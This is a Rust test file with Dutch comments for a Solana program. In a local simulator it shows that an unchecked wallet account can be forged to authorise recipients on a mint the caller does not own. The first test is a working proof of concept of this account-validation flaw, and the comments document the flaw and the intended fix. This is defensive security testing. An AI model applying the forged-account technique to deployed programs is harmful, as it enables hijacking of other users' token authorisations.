//! Accountmodel-aanvallen op `add_authorized_recipient`.
//!
//! De vraag die dit bestand beantwoordt: als `wallet` een `UncheckedAccount` is
//! zonder enige PDA- of eigendomscontrole, kan iemand dan een wallet-account
//! vervalsen en daarmee ontvangers autoriseren op een mint die hem niet toebehoort?
//!
//! De bestaande groene harness (`src/bin/hookflow.rs`) gebruikt zélf al een
//! gefabriceerd wallet-account op een willekeurig adres (`vaste_adres(0xA1)`,
//! eigen commentaar: "gefabriceerd account, géén spankwallet-programma"). Dat was
//! bedoeld als testgemak. Dit bestand kijkt of hetzelfde gebrek ook een aanval is.
//!
//! Hulpfuncties zijn bewust gekopieerd uit `hookflow.rs` in plaats van gehaald:
//! die wonen daar in een bin en delen kost een refactor van een werkend bestand.
//! Die refactor is verdiend werk, maar niet hier en nu.

use {
    litesvm::{types::FailedTransactionMetadata, LiteSVM},
    p256::ecdsa::{signature::Signer, SigningKey},
    sha2::Digest as _,
    sha3::Keccak256,
    solana_address::{address, Address},
    solana_instruction::{AccountMeta, Instruction},
    solana_keypair::Keypair,
    solana_message::{Message, VersionedMessage},
    solana_sdk_ids::sysvar,
    solana_signer::Signer as _,
    solana_transaction::versioned::VersionedTransaction,
};

const AD_ID: Address = address!("FzeAZmQzcGgwizWdg1y2hpTr1E6JEXeMQTyDXWQrYkzK");
const ACTION_NONCE: u64 = 1;

fn anchor_disc(ix: &str) -> [u8; 8] {
    let h = sha2::Sha256::digest(format!("global:{ix}").as_bytes());
    let mut d = [0u8; 8];
    d.copy_from_slice(&h[..8]);
    d
}

fn keccak256(delen: &[&[u8]]) -> [u8; 32] {
    let mut h = Keccak256::new();
    for d in delen { h.update(d); }
    let out = h.finalize();
    let mut r = [0u8; 32];
    r.copy_from_slice(&out);
    r
}

struct Passkey { sk: SigningKey, pk33: [u8; 33] }
struct Signed { client_data_json: Vec<u8>, signed_message: Vec<u8>, sig64: [u8; 64] }

impl Passkey {
    fn fixed(seed: u8) -> Self {
        let mut b = [0u8; 32];
        b[0] = seed; b[31] = 1;
        let sk = SigningKey::from_bytes(&b.into()).expect("vaste seed is een geldige P-256 sleutel");
        let mut pk33 = [0u8; 33];
        pk33.copy_from_slice(&sk.verifying_key().to_encoded_point(true).as_bytes());
        Self { sk, pk33 }
    }
    /// WebAuthn-structuur overgenomen uit src/bin/hookflow.rs:129-154, die op
    /// devnet en in LiteSVM slaagt: challenge in clientDataJSON, sha256 daarvan,
    /// 37 bytes authenticator-data met UV-vlag (0x04) erbij, en de handtekening
    /// over dat geheel — la-S genormaliseerd voor de precompile.
    fn sign(&self, challenge: &[u8; 32]) -> Signed {
        let client_data_json = format!(
            "{{\"type\":\"webauthn.get\",\"challenge\":\"{}\",\"origin\":\"https://harness.local\",\"crossOrigin\":false}}",
            base64url(challenge)
        ).into_bytes();
        let cdh = sha2::Sha256::digest(&client_data_json);
        let mut authenticator_data = vec![0u8; 37];
        authenticator_data[32] = 0x05; // UP | UV — het programma eist bit 0x04
        let mut signed_message = authenticator_data;
        signed_message.extend_from_slice(&cdh);

        let sig: p256::ecdsa::Signature = self.sk.sign(&signed_message);
        let sig = sig.normalize_s().unwrap_or(sig);
        let mut sig64 = [0u8; 64];
        sig64.copy_from_slice(&sig.to_bytes());
        Signed { client_data_json, signed_message, sig64 }
    }
}

fn base64url(d: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let mut s = String::new();
    for c in d.chunks(3) {
        let b = [c[0], c.get(1).copied().unwrap_or(0), c.get(2).copied().unwrap_or(0)];
        let n = (b[0] as u32) << 16 | (b[1] as u32) << 8 | b[2] as u32;
        s.push(T[(n >> 18 & 63) as usize] as char);
        s.push(T[(n >> 12 & 63) as usize] as char);
        if c.len() > 1 { s.push(T[(n >> 6 & 63) as usize] as char); }
        if c.len() > 2 { s.push(T[(n & 63) as usize] as char); }
    }
    s
}

/// Layout letterlijk overgenomen uit src/bin/hookflow.rs:159-191 (die zelf teruggaat
/// op tests/attachTransferHookIsolated.ts:112-132, devnet-geslaagd): teller(1) +
/// pad(1) + 7×u16 offsets + sig(64) + pk(33) + msg. Een eigen reconstructie hiervan
/// gaf `Custom(3)` en liet een negatieve test slagen voor de verkeerde reden.
fn secp256r1_ix(pk33: &[u8; 33], bericht: &[u8], sig64: &[u8; 64]) -> Instruction {
    const NO_OWN: u16 = u16::MAX;
    let data_start = 2 + 14usize;
    let sig_off = data_start;
    let pk_off = sig_off + 64;
    let msg_off = pk_off + 33;

    let mut data = vec![0u8; msg_off + bericht.len()];
    data[0] = 1;
    data[1] = 0;
    let mut o = 2usize;
    for v in [
        sig_off as u16, NO_OWN, pk_off as u16, NO_OWN, msg_off as u16,
        bericht.len() as u16, NO_OWN,
    ] {
        data[o..o + 2].copy_from_slice(&v.to_le_bytes());
        o += 2;
    }
    data[sig_off..sig_off + 64].copy_from_slice(sig64);
    data[pk_off..pk_off + 33].copy_from_slice(pk33);
    data[msg_off..].copy_from_slice(bericht);

    Instruction {
        program_id: address!("Secp256r1SigVerify1111111111111111111111111"),
        accounts: vec![],
        data,
    }
}

/// Wallet-account-bytes volgens de layout in crates/spankwallet-contract.
fn wallet_bytes(owner_passkey: &[u8; 33], nonce: u64) -> Vec<u8> {
    let mut d = vec![0u8; 174];
    d[0..8].copy_from_slice(&anchor_disc("wallet"));
    d[8..41].copy_from_slice(owner_passkey);
    d[41..73].copy_from_slice(&sha2::Sha256::digest(owner_passkey));
    d[73..106].copy_from_slice(owner_passkey);
    d[106] = 255; d[107] = 255;
    d[108..116].copy_from_slice(&1_700_000_000i64.to_le_bytes());
    d[148] = 0;
    d[149..157].copy_from_slice(&259_200i64.to_le_bytes());
    d[157] = 0;
    d[158..166].copy_from_slice(&nonce.to_le_bytes());
    d
}

struct Opstelling { svm: LiteSVM, payer: Keypair }

fn opstelling() -> Opstelling {
    let mut svm = LiteSVM::new();
    let (so, _) = ad_harness::so_path();
    let bytes = std::fs::read(&so).unwrap_or_else(|e| panic!("{} — {}", ad_harness::ontbreekt_fout(&so, "test"), e));
    svm.add_program(AD_ID, &bytes).expect("programma laden");
    let payer = ad_harness::vaste_toets(1);
    svm.airdrop(&payer.pubkey(), 5_000_000_000).unwrap();
    Opstelling { svm, payer }
}

fn stuur(svm: &mut LiteSVM, ixs: Vec<Instruction>, signers: &[&Keypair]) -> Result<(), String> {
    let bh = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&ixs, Some(&signers[0].pubkey()), &bh);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), signers).expect("tekenen");
    match svm.send_transaction(tx) {
        Ok(_) => Ok(()),
        Err(FailedTransactionMetadata { err, meta }) => {
            Err(format!("{err:?} | {}", meta.logs.join(" / ")))
        }
    }
}

/// Roept `add_authorized_recipient` aan met het doorgegeven wallet-account.
fn voeg_ontvanger_toe(
    o: &mut Opstelling,
    wallet: Address,
    mint: Address,
    recipient: Address,
    pk: &Passkey,
) -> Result<(), String> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&ACTION_NONCE.to_le_bytes());
    payload.extend_from_slice(mint.as_ref());
    payload.extend_from_slice(recipient.as_ref());
    let challenge = keccak256(&[AD_ID.as_ref(), wallet.as_ref(), b"add_authorized_recipient", &payload]);
    let s = pk.sign(&challenge);

    let mut data = anchor_disc("add_authorized_recipient").to_vec();
    data.extend_from_slice(recipient.as_ref());
    data.extend_from_slice(&ACTION_NONCE.to_le_bytes());
    data.extend_from_slice(&(s.client_data_json.len() as u32).to_le_bytes());
    data.extend_from_slice(&s.client_data_json);

    let (auth_rec, _) = Address::find_program_address(
        &[b"poison_authorized".as_slice(), mint.as_ref(), recipient.as_ref()], &AD_ID);

    let ix = Instruction {
        program_id: AD_ID,
        accounts: vec![
            AccountMeta::new_readonly(wallet, false),
            AccountMeta::new_readonly(AD_ID, false),          // passkeys: None
            AccountMeta::new_readonly(mint, false),
            AccountMeta::new(auth_rec, false),
            AccountMeta::new(o.payer.pubkey(), true),
            AccountMeta::new_readonly(sysvar::instructions::id(), false),
            AccountMeta::new_readonly(solana_sdk_ids::system_program::id(), false),
        ],
        data,
    };
    stuur(&mut o.svm, vec![secp256r1_ix(&pk.pk33, &s.signed_message, &s.sig64), ix], &[&o.payer])
}

/// Zet een willekeurig, data-dragend account neer (hier: de mint-stand-in).
fn zet_account(svm: &mut LiteSVM, a: Address, data: Vec<u8>, owner: Address) {
    let acc = solana_account::Account {
        lamports: svm.minimum_balance_for_rent_exemption(data.len()),
        data, owner, executable: false, rent_epoch: 0,
    };
    svm.set_account(a, acc).expect("account zetten");
}

/// KARAKTERISERENDE TEST — dit is géén gewenst gedrag.
///
/// Wat hier gebeurt: de aanmaker bouwt een wallet-account met ZIJN eigen passkey
/// op een willekeurig adres (géén spankwallet-PDA, géén spankwallet-eigenaar) en
/// autoriseert daarmee een ontvanger op een mint waar hij geen relatie mee heeft.
/// Het programma accepteert dat.
///
/// Waarom het kan: `wallet` is een `UncheckedAccount` zonder PDA- of
/// eigendomscontrole, en de PDA-seed van `authorized_recipient` is
/// `[poison_authorized, mint, recipient]` — de wallet komt in de seed niet voor.
/// Wie de instructie als eerste aanroept, bezet dus de autorisatie-slot voor
/// (mint, recipient), ongeacht wie de echte wallet- of mint-eigenaar is.
///
/// Deze test is groen zolang het lek bestaat. De fix (wallet-PDA afleiden uit het
/// eigen `seed_key`-veld onder spankwallet-ID en aan `wallet.key()` toetsen, plus
/// de wallet in de PDA-seed van `authorized_recipient` opnemen) maakt hem rood;
/// zet de assertie dan op `is_err()`.
#[test]
fn vervalsd_wallet_account_autoriseert_ontvanger_op_vremde_mint() {
    let mut o = opstelling();
    let aanmaker_pk = Passkey::fixed(77);

    // Wallet op een willekeurig adres, eigendom van een willekeurig programma.
    let wallet = ad_harness::vaste_adres(0xB1);
    zet_account(&mut o.svm, wallet, wallet_bytes(&aanmaker_pk.pk33, ACTION_NONCE),
                ad_harness::vaste_adres(0xB2));

    // Mint: staat hier model voor iemands anders poison-token.
    let mint = ad_harness::vaste_adres(0xC1);
    zet_account(&mut o.svm, mint, vec![0u8; 82],
                address!("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"));

    let recipient = ad_harness::vaste_adres(0xD1);

    let resultaat = voeg_ontvanger_toe(&mut o, wallet, mint, recipient, &aanmaker_pk);
    assert!(resultaat.is_ok(),
        "verwacht (huidige, verkeerde) aanvaarding; kreeg: {}", resultaat.unwrap_err());

    let (auth_rec, _) = Address::find_program_address(
        &[b"poison_authorized".as_slice(), mint.as_ref(), recipient.as_ref()], &AD_ID);
    let acc = o.svm.get_account(&auth_rec).expect("PDA zou nu moeten bestaan");
    assert_eq!(acc.data.len(), 8 + 32 + 32 + 1, "AuthorizedRecipient heeft onverwachte grootte");
}

/// Tegenpool: de challenge-binding wél in orde. Iemand die over een ándere mint
/// tekent dan de instructie doorgeeft, moet falen. Als deze test faalt ligt het
/// aan de signatuurverificatie, niet aan de wallet-controle — en dat is een ander
/// (ergere) probleem.
#[test]
fn handtekening_over_andere_mint_wordt_geweigerd() {
    let mut o = opstelling();
    let pk = Passkey::fixed(78);

    let wallet = ad_harness::vaste_adres(0xB3);
    zet_account(&mut o.svm, wallet, wallet_bytes(&pk.pk33, ACTION_NONCE),
                ad_harness::vaste_adres(0xB4));
    let mint = ad_harness::vaste_adres(0xC2);
    zet_account(&mut o.svm, mint, vec![0u8; 82],
                address!("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"));
    let recipient = ad_harness::vaste_adres(0xD2);

    // Challenge over een ANDERE mint dan die in de instructie staat.
    let andere_mint = ad_harness::vaste_adres(0xC9);
    let mut payload = Vec::new();
    payload.extend_from_slice(&ACTION_NONCE.to_le_bytes());
    payload.extend_from_slice(andere_mint.as_ref());
    payload.extend_from_slice(recipient.as_ref());
    let challenge = keccak256(&[AD_ID.as_ref(), wallet.as_ref(), b"add_authorized_recipient", &payload]);
    let s = pk.sign(&challenge);

    let mut data = anchor_disc("add_authorized_recipient").to_vec();
    data.extend_from_slice(recipient.as_ref());
    data.extend_from_slice(&ACTION_NONCE.to_le_bytes());
    data.extend_from_slice(&(s.client_data_json.len() as u32).to_le_bytes());
    data.extend_from_slice(&s.client_data_json);

    let (auth_rec, _) = Address::find_program_address(
        &[b"poison_authorized".as_slice(), mint.as_ref(), recipient.as_ref()], &AD_ID);

    let ix = Instruction {
        program_id: AD_ID,
        accounts: vec![
            AccountMeta::new_readonly(wallet, false),
            AccountMeta::new_readonly(AD_ID, false),
            AccountMeta::new_readonly(mint, false),
            AccountMeta::new(auth_rec, false),
            AccountMeta::new(o.payer.pubkey(), true),
            AccountMeta::new_readonly(sysvar::instructions::id(), false),
            AccountMeta::new_readonly(solana_sdk_ids::system_program::id(), false),
        ],
        data,
    };
    let r = stuur(&mut o.svm, vec![secp256r1_ix(&pk.pk33, &s.signed_message, &s.sig64), ix], &[&o.payer]);
    // Anchor meldt eigen fouten als 6000+index: 6002 = WebAuthnChallengeMismatch,
    // 6001 = InvalidPasskeySignature. (Let op de instructie-index: een fout op
    // index 0 komt uit de precompile zelf, op index 1 uit ons programma — die
    // twee verwarden kostte me hier een rondte.)
    let f = r.clone().unwrap_err();
    assert!(f.contains("WebAuthnChallengeMismatch") || f.contains("Custom(6002)")
            || f.contains("InvalidPasskeySignature") || f.contains("Custom(6001)"),
        "niet geweigerd wegens challenge-binding, maar om een andere reden: {f}");
    assert!(o.svm.get_account(&auth_rec).is_none(), "er is toch een autorisatie-PDA ontstaan");
}
